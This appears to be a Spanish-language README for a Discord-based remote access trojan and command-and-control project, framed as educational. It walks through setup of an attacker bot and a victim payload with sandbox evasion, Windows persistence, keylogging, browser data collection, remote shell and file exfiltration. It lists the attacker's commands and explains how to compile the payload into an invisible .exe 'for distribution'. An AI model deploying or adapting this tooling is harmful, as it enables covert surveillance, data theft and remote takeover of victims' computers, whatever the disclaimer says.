# 🎓 RAT-C2 — Análisis de Malware con Discord

> **⚠️ AVISO LEGAL:** Este proyecto debe usarse exclusivamente en entornos
> controlados con autorización explícita. El uso no autorizado es ilegal.
> Ver [DISCLAIMER.md](DISCLAIMER.md).

---

## 📌 ¿Qué es este proyecto?

Un proyecto que demuestra cómo funciona un **RAT** (Remote Access
Trojan) y su infraestructura **C2** (Command and Control) usando **Discord**
como canal de comunicación entre el atacante y la víctima.

### Arquitectura

```
┌─────────────────┐         ┌──────────────────┐         ┌─────────────────┐
│   VÍCTIMA       │         │   DISCORD (C2)    │         │   ATACANTE      │
│                 │  envía  │                  │  recibe │                 │
│  victim/        │────────▶│  Canal #general  │◀────────│  attacker/      │
│  client.py      │         │                  │         │  bot.py         │
│                 │◀────────│                  │────────▶│                 │
│  6 módulos      │ recibe  │                  │  envía  │  Panel de       │
│                 │ comandos│                  │ comandos│  control        │
└─────────────────┘         └──────────────────┘         └─────────────────┘
```

**Flujo:**
1. El **atacante** ejecuta `bot.py` → se conecta a Discord
2. La **víctima** ejecuta `client.py` → se conecta al mismo canal
3. La víctima envía su info del sistema al canal
4. El atacante escribe comandos (`!shell`, `!screenshot`, etc.)
5. La víctima ejecuta los comandos y responde en Discord

---

## 📁 Estructura del proyecto

```
rat-educational-lab/
├── attacker/                  # 🤖 Centro de comando (atacante)
│   ├── bot.py                 #    Bot de Discord C2 (todo integrado)
│   ├── .env                   #    Token y configuración (NO subir a git)
│   ├── requirements.txt       #    Dependencias
│   └── README.md
│
├── victim/                    # 💻 Payload de la víctima
│   ├── client.py              #    Script principal de la víctima
│   ├── modules/
│   │   ├── __init__.py        #    Paquete Python válido
│   │   ├── environment.py     #    Detección de sandbox/VM/debugger
│   │   ├── persistence.py     #    Técnicas de persistencia
│   │   ├── intelligence.py    #    Recopilación de información
│   │   ├── discord_c2.py      #    Cliente C2 vía Discord
│   │   ├── commands.py        #    Ejecutor de comandos remotos
│   │   └── keylogger.py       #    Keylogger (pynput)
│   ├── requirements.txt       #    Dependencias
│   └── README.md
│
├── test_connection.py         # 🔍 Test de conexión del bot
├── test_victim_modules.py     # 🧪 Test de módulos de la víctima (114 tests)
├── docs/                      # 📚 Documentación técnica
├── DISCLAIMER.md              # ⚠️ Aviso legal
├── LICENSE.md                 # 📄 Licencia
└── README.md                  # 📖 Este archivo
```

---

## 🛠️ Configuración del Bot en Discord

### Paso 1: Crear la aplicación

1. Ve a **https://discord.com/developers/applications**
2. Haz clic en **"New Application"** → ponle un nombre → **"Create"**

### Paso 2: Crear el bot

1. En el menú lateral, ve a **"Bot"**
2. Haz clic en **"Add Bot"** → **"Yes, do it!"**
3. ⚠️ **ACTIVA estos 3 Intents** (obligatorio):

   | Intent | Estado |
   |--------|--------|
   | PRESENCE INTENT | ✅ ON |
   | SERVER MEMBERS INTENT | ✅ ON |
   | MESSAGE CONTENT INTENT | ✅ ON |

4. Haz clic en **"Reset Token"** y **copia el token** (empieza con `MTU...`)
   - ⚠️ Se muestra solo una vez. Guárdalo bien.

### Paso 3: Invitar el bot al servidor

1. Ve a **"OAuth2"** → **"URL Generator"**
2. En **Scopes** marca: `bot` y `applications.commands`
3. En **Bot Permissions** marca: `Administrator`
4. Copia la **URL** generada al fondo de la página
5. Ábrela en tu navegador → selecciona tu servidor → **"Autorizar"**

### Paso 4: Obtener el Channel ID

1. En Discord, ve a **Configuración de Usuario** (⚙️) → **Avanzado**
2. Activa **"Modo Desarrollador"**
3. **Clic derecho** en el canal de texto (ej: `#general`)
4. **"Copiar ID del Canal"**
5. ⚠️ Este ID es diferente al ID del servidor. Ejemplo:
   - Servidor ID: `1559156938573357109`
   - Canal ID:    `1559156939974250559` ← Este es el que necesitas

---

## 🚀 Instalación

### Requisitos

- Python 3.10+
- Una cuenta de Discord
- Un servidor de Discord propio

### Pasos

```bash
# 1. Clonar el repositorio
git clone https://github.com/HubertUi/RAT-c2.git
cd RAT-c2

# 2. Crear entorno virtual
python3 -m venv venv

# 3. Activar entorno virtual
source venv/bin/activate        # Linux/macOS
venv\Scripts\activate           # Windows

# 4. Instalar dependencias
pip install -r attacker/requirements.txt
pip install -r victim/requirements.txt
```

---

## ⚙️ Configuración

Crea el archivo `attacker/.env`:

```env
DISCORD_BOT_TOKEN=tu_token_aqui
COMMAND_CHANNEL_ID=tu_channel_id_aqui
```

| Variable | Descripción |
|----------|-------------|
| `DISCORD_BOT_TOKEN` | Token del bot (Paso 2) |
| `COMMAND_CHANNEL_ID` | ID del canal de texto (Paso 4) |

> ⚠️ El archivo `.env` está en `.gitignore` — **NUNCA** lo subas a GitHub.

---

## ▶️ Ejecución

### 1. Probar la conexión

```bash
source venv/bin/activate
python test_connection.py
```

Verás algo como:

```
==================================================
TEST DE CONEXIÓN - BOT C2 DISCORD
==================================================

[1] Token cargado: MTU1ODk3NzIxMjA5NzQ5NTE5M...
[2] Channel ID: 1559156939974250559

[0] Conectando a Discord...

[3] ✅ Bot conectado como: RAT-C2#0196
[4] ✅ ID del bot: 1558977212097495191
[5] ✅ Servidores conectados: 1
    - RAT - C2 lab (ID: 1559156938573357109)

[6] ✅ Canal encontrado: #general
[7] ✅ Tipo de canal: text
[8] ✅ Mensaje enviado al canal #general

✅ TODOS LOS TESTS PASARON CORRECTAMENTE
```

Si todo funciona, verás un **embed verde** en Discord: *"🟢 TEST EXITOSO"*.

### 2. Iniciar el bot atacante

```bash
source venv/bin/activate
python -u attacker/bot.py
```

Salida esperada:

```
[+] Bot conectado como: RAT-C2#0196
[+] Canal de comandos: 1559156939974250559
```

En Discord aparecerá: *"C2 Server Iniciado — Esperando conexiones..."*

Cuando una víctima se conecte, verás:

```
[2026-10-13 12:00:00] ATACANTE:BOT_INICIADO
[2026-10-13 12:00:05] ATACANTE:NUEVA_SESION abc123
```

Y en Discord:

```
🔔 Nueva víctima conectada: abc123
```

La víctima envía un embed con: IP Pública, Sistema, Usuario y Admin.

### 3. Ejecutar el payload de la víctima

En **otra terminal** (o en otra máquina):

```bash
source venv/bin/activate
python victim/client.py --token TU_TOKEN --channel TU_CHANNEL_ID
```

> Para testing en sandbox, agrega `--allow-sandbox`

La víctima se conectará y enviará un embed con:
- IP Pública
- Sistema Operativo
- Usuario y si es Admin
- Se registrará automáticamente en el panel del atacante

---

## 🧪 Tests

### Test de módulos de la víctima (114 pruebas)

```bash
source venv/bin/activate
python test_victim_modules.py
```

**Qué verifica:**

| Módulo | Pruebas | Descripción |
|--------|---------|-------------|
| Imports | 6 | Los 6 módulos se importan sin errores |
| `__init__.py` | 1 | El directorio es un paquete Python válido |
| `EnvironmentChecker` | 15 | Detección de VM, sandbox, debugger, fingerprint |
| `IntelligenceCollector` | 18 | Recopilación de info del sistema, usuario, red |
| `Keylogger` | 16 | Start/stop, buffer, teclas especiales, clear |
| `CommandExecutor` | 44 | Los 17 handlers + flujo de comandos completo |
| `PersistenceManager` | — | Se omite en Linux (requiere Windows) |
| `DiscordC2Client` | 7 | Estructura y métodos del cliente C2 |
| `process_queue` | 1 | Cola asíncrona de comandos |

**Salida esperada:**

```
============================================================
RESULTADO: 114 pasaron, 0 fallaron
============================================================
✅ TODOS LOS TESTS PASARON
```

### Test de conexión del bot

```bash
source venv/bin/activate
python test_connection.py
```

Verifica que el bot se conecta a Discord y puede enviar mensajes al canal.

---

## 🎮 Comandos disponibles

Los comandos se escriben en el canal de Discord con prefijo `!`:

### 📁 Navegación

| Comando | Descripción |
|---------|-------------|
| `!ls [ruta]` | Listar archivos del directorio |
| `!cd <ruta>` | Cambiar directorio |
| `!pwd` | Mostrar directorio actual |
| `!cat <archivo>` | Ver contenido de un archivo |

### 📥 Transferencia

| Comando | Descripción |
|---------|-------------|
| `!download <ruta>` | Descargar archivo de la víctima |
| `!upload` (con adjunto) | Subir archivo a la víctima |

### 📸 Captura

| Comando | Descripción |
|---------|-------------|
| `!screenshot` | Captura de pantalla |

### ⚙️ Sistema

| Comando | Descripción |
|---------|-------------|
| `!shell <comando>` | Ejecutar comando en la terminal |
| `!processes` | Listar procesos activos |
| `!info` | Información completa del sistema |

### 🔍 Keylogger

| Comando | Descripción |
|---------|-------------|
| `!keylog start` | Iniciar captura de teclas |
| `!keylog stop` | Detener captura de teclas |
| `!keylog_dump` | Obtener teclas capturadas y limpiar buffer |

### 🔧 Persistencia

| Comando | Descripción |
|---------|-------------|
| `!persist` | Establecer persistencia en el sistema |

### 🔄 Control

| Comando | Descripción |
|---------|-------------|
| `!exit` | Cerrar sesión del RAT |
| `!help` | Mostrar todos los comandos de la víctima |

### 🤖 Comandos del bot atacante (panel)

| Comando | Descripción |
|---------|-------------|
| `!sessions` | Listar sesiones activas |
| `!victim <id>` | Ver detalle de una víctima (IP, OS, usuario, admin) |
| `!broadcast <msg>` | Enviar mensaje a todas las sesiones |
| `!keylog_dump` | Solicitar volcado del keylogger a todas las víctimas |
| `!notify on/off` | Activar/desactivar notificaciones de nuevas víctimas |
| `!cleanup` | Limpiar sesiones inactivas (>1 hora) |
| `!info` | Información del bot (latencia, servidores, sesiones) |
| `!help_c2` | Mostrar ayuda del panel |

---

## 🧩 Módulos de la víctima

> El directorio `modules/` incluye `__init__.py` — es un paquete Python válido.

### 1. `environment.py` — Verificación de entorno
- Detección de sandbox (VirtualBox, VMware, QEMU)
- Detección de debugger
- Verificación de análisis dinámico
- Si detecta entorno de análisis → sale automáticamente

### 2. `persistence.py` — Persistencia
- Claves de registro de Windows
- Carpeta de inicio
- Tareas programadas
- WMI (Windows Management Instrumentation)

### 3. `intelligence.py` — Recopilación de información
- Sistema operativo y hardware
- Red (IP pública, interfaces)
- Usuario actual y privilegios
- Software instalado
- Datos de navegadores

### 4. `discord_c2.py` — Comunicación C2
- Conexión a Discord como cliente
- Registro de sesión en el canal
- Cola de comandos asíncrona
- Envío de archivos, capturas y mensajes

### 5. `commands.py` — Ejecutor de comandos
- Ejecución de comandos shell
- Captura de pantalla
- Transferencia de archivos
- Gestión de procesos
- Keylogger (start/stop/dump)
- Persistencia remota

### 6. `keylogger.py` — Keylogger
- Captura teclas usando `pynput`
- Buffer thread-safe con `threading.Lock`
- Detecta caracteres especiales (Enter, Shift, Ctrl, etc.)
- Estado con uptime y contador de teclas
- Limpieza automática del buffer después del dump

---

## 🔍 Flujo completo de ejecución

```
1. atacante ejecuta bot.py
   └─▶ Bot se conecta a Discord
   └─▶ Envía "C2 Server Iniciado" al canal

2. víctima ejecuta client.py
   └─▶ Fase 1: Verifica entorno (sandbox/debugger)
   └─▶ Fase 2: Establece persistencia
   └─▶ Fase 3: Recopila información del sistema
   └─▶ Fase 4: Se conecta a Discord
   └─▶ Fase 5: Envía IP, OS, usuario y admin al canal
   └─▶ Fase 6: Entra en modo escucha de comandos

3. atacante escribe comandos en Discord
   └─▶ !shell whoami
   └─▶ !screenshot
   └─▶ !keylog start
   └─▶ !keylog_dump
   └─▶ !victim <id>
   └─▶ !download C:\Users\victim\file.txt

4. víctima ejecuta los comandos
   └─▶ Responde con resultados en Discord

5. atacante monitorea el panel
   └─▶ !sessions    → ver sesiones activas
   └─▶ !notify on   → alertas de nuevas víctimas
   └─▶ !info        → estado del bot
```

---

## ❗ Solución de problemas

| Error | Causa | Solución |
|-------|-------|----------|
| `No module named 'discord'` | Dependencias no instaladas | `pip install -r requirements.txt` |
| `401 Unauthorized` | Token inválido | Regenera el token en Developer Portal |
| `Missing Access` | Bot no está en el servidor | Invita el bot con OAuth2 |
| `Intent no habilitado` | Faltan intents | Activa los 3 intents en Paso 2 |
| `Canal no encontrado` | ID incorrecto | Verifica que es el ID del canal, no del servidor |
| `Permission denied` | Sin permisos | Re-invita con permiso `Administrator` |

---

## 📦 Crear archivo .exe para distribución (Windows)

Para distribuir el payload como un archivo `.exe` ejecutable en Windows sin necesidad de Python instalado:

### Paso 1: Consolidar los archivos (opcional pero recomendado)

Para crear un `.exe` funcional, puedes unir todos los módulos en un solo archivo:

```
victim/
├── client.py                  # ← Consolidar todo aquí
└── modules/                   # ← Se puede eliminar después
    ├── environment.py
    ├── persistence.py
    ├── intelligence.py
    ├── discord_c2.py
    └── commands.py
```

**Ventajas de consolidar:**
- Un solo archivo `.exe` más limpio
- Menos problemas de imports
- Distribución más simple

### Paso 2: Instalar PyInstaller

```bash
pip install pyinstaller
```

### Paso 3: Crear el .exe

```bash
cd victim

# Opción básica (con ventana de terminal)
pyinstaller --onefile client.py

# Opción sin ventana (invisible)
pyinstaller --onefile --noconsole client.py

# Opción con nombre personalizado
pyinstaller --onefile --noconsole --name=RAT-Lab client.py
```

### Resultado

```
victim/
├── dist/
│   └── client.exe    ← Archivo ejecutable (~30-50 MB)
└── build/            ← Archivos temporales (se puede borrar)
```

### Características del .exe

| Característica | Descripción |
|----------------|-------------|
| Tamaño | ~30-50 MB (incluye Python + librerías) |
| Sistema | Solo Windows |
| Python | No necesario en la víctima |
| Ejecución | Doble clic para ejecutar |

### ⚠️ Consideraciones importantes

1. **Antivirus:** Los archivos `.exe` creados con PyInstaller pueden ser detectados por antivirus (falso positivo o real).

2. **Token:** El `.exe` debe tener el token y channel ID configurados. Puedes:
   - Pasarlos por argumentos: `client.exe --token XXX --channel YYY`
   - O incrustarlos en el código antes de compilar

3. **Sistema operativo:** El `.exe` solo funciona en Windows (el código usa APIs de Windows como `winreg`, `ctypes.windll`)

### Ejemplo completo

```bash
# 1. Navegar a la carpeta de la víctima
cd victim

# 2. Instalar PyInstaller
pip install pyinstaller

# 3. Crear el .exe
pyinstaller --onefile --noconsole --name=RAT-Lab client.py

# 4. Ejecutar en la víctima
dist\RAT-Lab.exe --token TU_TOKEN --channel TU_CHANNEL
```

---

## 📚 Documentación adicional

- [DISCLAIMER.md](DISCLAIMER.md) — Aviso legal completo
- [docs/analisis_tecnicas.md](docs/analisis_tecnicas.md) — Análisis de técnicas
- [docs/contramedidas.md](docs/contramedidas.md) — Guías de detección

---

## 📄 Licencia

Este proyecto está bajo licencia propia. Ver [LICENSE.md](LICENSE.md).

---

**Proyecto de ciberseguridad — Solo para entornos controlados con autorización.**
